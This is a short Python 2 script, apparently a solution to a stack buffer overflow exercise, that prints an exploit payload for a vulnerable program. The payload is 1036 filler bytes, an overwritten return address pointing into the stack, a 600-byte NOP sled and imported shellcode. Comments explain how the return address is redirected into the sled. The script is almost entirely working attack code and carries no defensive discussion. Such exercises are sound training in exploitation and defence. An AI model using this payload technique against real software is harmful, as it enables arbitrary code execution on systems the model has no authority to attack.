from shellcode import shellcode
from struct import pack

# ebp of _main = 0xbffe9a18
# first, let vulnerable return to an address larger than main's ebp
# populate the stack with nops and then shellcode
# will execute shellcode once sees it
# \x90 - nop

buff_zone = 0xbffe9a2c 
print 'a'*1036 + pack("<I",buff_zone) + "\x90"*600 + shellcode 
